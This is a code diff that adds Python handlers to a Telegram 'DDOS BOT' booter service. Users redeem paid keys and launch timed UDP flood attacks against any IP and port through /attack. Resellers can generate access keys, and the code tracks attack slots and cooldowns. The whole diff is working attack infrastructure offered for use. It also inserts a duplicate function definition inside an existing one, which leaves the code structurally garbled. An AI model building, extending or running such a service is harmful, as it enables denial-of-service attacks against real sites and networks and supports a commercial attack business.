@@ -640,6 +640,277 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
             if value is None:
                 hosted_bot.reply_to(msg, "❌ Invalid duration! Use 1 or 5h")
                 return
+
+attack_cleanup_thread = threading.Thread(target=attack_cleanup, daemon=True)
+attack_cleanup_thread.start()
+
+def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
+    try:
+        print(f"🔄 Starting hosted bot...")
+        if bot_token in hosted_bot_instances:
+            try:
+                hosted_bot_instances[bot_token].stop_polling()
+                time.sleep(1)
+            except:
+                pass
+            del hosted_bot_instances[bot_token]
+        test_bot = telebot.TeleBot(bot_token)
+        test_bot.remove_webhook()
+        time.sleep(2)
+        bot_info = test_bot.get_me()
+        print(f"✅ Hosted bot @{bot_info.username} is valid")
+        hosted_bot = telebot.TeleBot(bot_token)
+        hosted_bot_instances[bot_token] = hosted_bot
+        hosted_cooldown_data = {}
+        
+        @hosted_bot.message_handler(commands=['start'])
+        def hosted_start(msg):
+            current_time = format_ist_time(get_current_ist())
+            hosted_bot.reply_to(msg, f"✨ DDOS BOT ✨\n\n👑 Owner: {owner_name}\n✅ Status: Active\n⚡ Concurrent: {concurrent}\n⏱️ Max Time: 300s\n📅 Server Time: {current_time}\n\n📝 COMMANDS:\n/attack IP PORT TIME\n/status\n/cooldown\n/addreseller USER_ID\n/removereseller USER_ID\n/removekey KEY\n/genkey 1 or 5h\n/addgroup GROUP_ID TIME\n/mykeys\n/redeem KEY\n/help")
+        
+        @hosted_bot.message_handler(commands=['cooldown'])
+        def hosted_cooldown(msg):
+            uid = str(msg.chat.id)
+            if uid in hosted_cooldown_data:
+                remaining = hosted_cooldown_data[uid] - time.time()
+                if remaining > 0:
+                    hosted_bot.reply_to(msg, f"⏳ Cooldown: {int(remaining)}s remaining!")
+                else:
+                    del hosted_cooldown_data[uid]
+                    hosted_bot.reply_to(msg, "✅ No cooldown! You can attack now.")
+            else:
+                hosted_bot.reply_to(msg, "✅ No cooldown! You can attack now.")
+        
+        @hosted_bot.message_handler(commands=['addgroup'])
+        def hosted_add_group(msg):
+            uid = str(msg.chat.id)
+            if uid != owner_id:
+                hosted_bot.reply_to(msg, "❌ Only bot owner can add groups!")
+                return
+            args = msg.text.split()
+            if len(args) != 3:
+                hosted_bot.reply_to(msg, "⚠️ Usage: /addgroup GROUP_ID TIME\n📌 Example: /addgroup -100123456789 60")
+                return
+            group_id = args[1]
+            try:
+                attack_time = int(args[2])
+                if attack_time < 10 or attack_time > 300:
+                    hosted_bot.reply_to(msg, "❌ Attack time must be 10-300 seconds!")
+                    return
+            except:
+                hosted_bot.reply_to(msg, "❌ Invalid time!")
+                return
+            groups[group_id] = {"attack_time": attack_time, "added_by": uid, "added_at": time.time()}
+            save_groups(groups)
+            hosted_bot.reply_to(msg, f"✅ GROUP ADDED!\n👥 Group ID: {group_id}\n⏱️ Attack Time: {attack_time}s")
+        
+        @hosted_bot.message_handler(commands=['removegroup'])
+        def hosted_remove_group(msg):
+            uid = str(msg.chat.id)
+            if uid != owner_id:
+                hosted_bot.reply_to(msg, "❌ Only bot owner can remove groups!")
+                return
+            args = msg.text.split()
+            if len(args) != 2:
+                hosted_bot.reply_to(msg, "⚠️ Usage: /removegroup GROUP_ID")
+                return
+            group_id = args[1]
+            if group_id in groups:
+                del groups[group_id]
+                save_groups(groups)
+                hosted_bot.reply_to(msg, f"✅ GROUP REMOVED!\n👥 Group ID: {group_id}")
+            else:
+                hosted_bot.reply_to(msg, "❌ Group not found!")
+        
+        @hosted_bot.message_handler(commands=['removekey'])
+        def hosted_remove_key(msg):
+            uid = str(msg.chat.id)
+            if uid != owner_id:
+                hosted_bot.reply_to(msg, "❌ Only bot owner can remove keys!")
+                return
+            args = msg.text.split()
+            if len(args) != 2:
+                hosted_bot.reply_to(msg, "⚠️ Usage: /removekey KEY")
+                return
+            key = args[1]
+            if key not in keys_data:
+                hosted_bot.reply_to(msg, "❌ Key not found!")
+                return
+            del keys_data[key]
+            save_keys(keys_data)
+            hosted_bot.reply_to(msg, f"✅ KEY REMOVED!\n🔑 Key: {key}")
+        
+        @hosted_bot.message_handler(commands=['attack'])
+        def hosted_attack(msg):
+            uid = str(msg.chat.id)
+            if uid not in users:
+                hosted_bot.reply_to(msg, "❌ ACCESS DENIED!\n\nYou don't have an active key.\nUse /redeem KEY to activate your access.")
+                return
+            if not check_user_expiry(uid):
+                hosted_bot.reply_to(msg, "❌ ACCESS EXPIRED!\n\nYour key has expired.\nUse /redeem KEY to get new access.")
+                return
+            args = msg.text.split()
+            if len(args) != 4:
+                hosted_bot.reply_to(msg, "⚠️ Usage: /attack IP PORT TIME\n📌 Example: /attack 1.1.1.1 443 60")
+                return
+            ip, port, duration = args[1], args[2], args[3]
+            if not validate_ip(ip):
+                hosted_bot.reply_to(msg, "❌ Invalid IP address!")
+                return
+            try:
+                port = int(port)
+                duration = int(duration)
+                if duration < 10 or duration > 300:
+                    hosted_bot.reply_to(msg, "❌ Duration must be 10-300 seconds!")
+                    return
+            except:
+                hosted_bot.reply_to(msg, "❌ Invalid port or time!")
+                return
+            
+            total_active = get_total_active_count()
+            if total_active >= MAX_CONCURRENT:
+                hosted_bot.reply_to(msg, f"❌ GLOBAL LIMIT REACHED!\n🌐 Total active attacks across ALL bots: {total_active}/{MAX_CONCURRENT}\n💡 Wait for an attack to finish.")
+                return
+            
+            now = time.time()
+            active_in_this_bot = 0
+            if bot_token in hosted_bots:
+                for aid, ainfo in hosted_bots[bot_token].get("active_attacks", {}).items():
+                    if now < ainfo["finish_time"]:
+                        active_in_this_bot += 1
+                if active_in_this_bot >= concurrent:
+                    hosted_bot.reply_to(msg, f"❌ THIS BOT'S LIMIT REACHED!\n📊 Active attacks: {active_in_this_bot}/{concurrent}\n💡 Use /status to check")
+                    return
+            
+            if uid in hosted_cooldown_data:
+                remaining = hosted_cooldown_data[uid] - now
+                if remaining > 0:
+                    hosted_bot.reply_to(msg, f"⏳ Wait {int(remaining)} seconds!")
+                    return
+            
+            attack_id = f"hosted_{bot_token}_{uid}_{int(now)}_{random.randint(1000, 9999)}"
+            target_key = f"{ip}:{port}"
+            finish_time = now + duration
+            
+            target_under_attack = False
+            if bot_token in hosted_bots:
+                for aid, ainfo in hosted_bots[bot_token].get("active_attacks", {}).items():
+                    if ainfo["target_key"] == target_key and now < ainfo["finish_time"]:
+                        target_under_attack = True
+                        break
+            if target_under_attack:
+                hosted_bot.reply_to(msg, f"❌ TARGET UNDER ATTACK!\n🎯 {target_key} is already being attacked.")
+                return
+            
+            hosted_cooldown_data[uid] = now + COOLDOWN_TIME
+            if bot_token not in hosted_bots:
+                hosted_bots[bot_token] = {"active_attacks": {}, "owner_id": owner_id, "owner_name": owner_name, "concurrent": concurrent}
+            if "active_attacks" not in hosted_bots[bot_token]:
+                hosted_bots[bot_token]["active_attacks"] = {}
+            
+            hosted_bots[bot_token]["active_attacks"][attack_id] = {
+                "user": uid,
+                "finish_time": finish_time,
+                "ip": ip,
+                "port": port,
+                "target_key": target_key
+            }
+            save_hosted_bots(hosted_bots)
+            
+            new_active = 0
+            for aid, ainfo in hosted_bots[bot_token]["active_attacks"].items():
+                if now < ainfo["finish_time"]:
+                    new_active += 1
+            new_total = get_total_active_count()
+            current_time = format_ist_time(get_current_ist())
+            hosted_bot.reply_to(msg, f"✨ ATTACK LAUNCHED! ✨\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n⚡ Method: UDP (Auto)\n📅 Time: {current_time}\n📊 This Bot Slots: {new_active}/{concurrent}\n🌐 Global Active: {new_total}/{MAX_CONCURRENT}")
+            
+            def run():
+                send_attack_to_api(ip, port, duration, msg.chat.id, hosted_bot, is_hosted=True)
+                if bot_token in hosted_bots and attack_id in hosted_bots[bot_token]["active_attacks"]:
+                    del hosted_bots[bot_token]["active_attacks"][attack_id]
+                    save_hosted_bots(hosted_bots)
+            threading.Thread(target=run).start()
+        
+        @hosted_bot.message_handler(commands=['status'])
+        def hosted_status(msg):
+            current_time = format_ist_time(get_current_ist())
+            if bot_token in hosted_bots:
+                bot_info = hosted_bots[bot_token]
+                now = time.time()
+                active_list = []
+                for aid, info in bot_info.get("active_attacks", {}).items():
+                    if now < info["finish_time"]:
+                        remaining = int(info["finish_time"] - now)
+                        mins = remaining // 60
+                        secs = remaining % 60
+                        time_str = f"{mins}m {secs}s" if mins > 0 else f"{secs}s"
+                        active_list.append(f"❌ SLOT {len(active_list)+1}: BUSY\n└ 🎯 {info['target_key']}\n└ 👤 {info['user']}\n└ ⏰ {time_str} left")
+                status_msg = f"📊 THIS BOT SLOT STATUS\n📅 {current_time}\n\n"
+                for i in range(bot_info["concurrent"]):
+                    if i < len(active_list):
+                        status_msg += active_list[i] + "\n\n"
+                    else:
+                        status_msg += f"✅ SLOT {i+1}: FREE\n└ 💡 Ready for attack\n\n"
+                status_msg += f"📊 TOTAL ACTIVE IN THIS BOT: {len(active_list)}/{bot_info['concurrent']}"
+                hosted_bot.reply_to(msg, status_msg)
+            else:
+                hosted_bot.reply_to(msg, f"✅ ALL SLOTS FREE ✅\n\nNo ongoing attacks detected!\n📅 {current_time}")
+        
+        @hosted_bot.message_handler(commands=['addreseller'])
+        def hosted_add_reseller(msg):
+            uid = str(msg.chat.id)
+            if uid != owner_id:
+                hosted_bot.reply_to(msg, "❌ Only bot owner can add resellers!")
+                return
+            args = msg.text.split()
+            if len(args) != 2:
+                hosted_bot.reply_to(msg, "⚠️ Usage: /addreseller USER_ID")
+                return
+            new_reseller = args[1]
+            if new_reseller not in resellers:
+                resellers.append(new_reseller)
+                users_data["resellers"] = resellers
+                save_users(users_data)
+                hosted_bot.reply_to(msg, f"✅ RESELLER ADDED!\n👤 User: {new_reseller}\n🔑 Can now generate keys")
+            else:
+                hosted_bot.reply_to(msg, "❌ User is already a reseller!")
+        
+        @hosted_bot.message_handler(commands=['removereseller'])
+        def hosted_remove_reseller(msg):
+            uid = str(msg.chat.id)
+            if uid != owner_id:
+                hosted_bot.reply_to(msg, "❌ Only bot owner can remove resellers!")
+                return
+            args = msg.text.split()
+            if len(args) != 2:
+                hosted_bot.reply_to(msg, "⚠️ Usage: /removereseller USER_ID")
+                return
+            target = args[1]
+            if target in resellers:
+                resellers.remove(target)
+                users_data["resellers"] = resellers
+                save_users(users_data)
+                hosted_bot.reply_to(msg, f"✅ RESELLER REMOVED!\n👤 User: {target}")
+            else:
+                hosted_bot.reply_to(msg, "❌ User is not a reseller!")
+        
+        @hosted_bot.message_handler(commands=['genkey'])
+        def hosted_genkey(msg):
+            uid = str(msg.chat.id)
+            is_reseller = uid in resellers
+            if uid != owner_id and not is_reseller:
+                hosted_bot.reply_to(msg, "❌ Owner or Reseller only!")
+                return
+            args = msg.text.split()
+            if len(args) != 2:
+                hosted_bot.reply_to(msg, "⚠️ Usage: /genkey 1 (1 day) or /genkey 5h (5 hours)")
+                return
+            duration_str = args[1]
+            value, unit = parse_duration(duration_str)
+            if value is None:
+                hosted_bot.reply_to(msg, "❌ Invalid duration! Use 1 or 5h")
+                return
             key = generate_key()
             expires_at = get_expiry_date(value, unit)
             keys_data[key] = {"user_id": "pending", "duration_value": value, "duration_unit": unit, "generated_by": uid, "generated_at": time.time(), "expires_at": expires_at.timestamp(), "used": False}
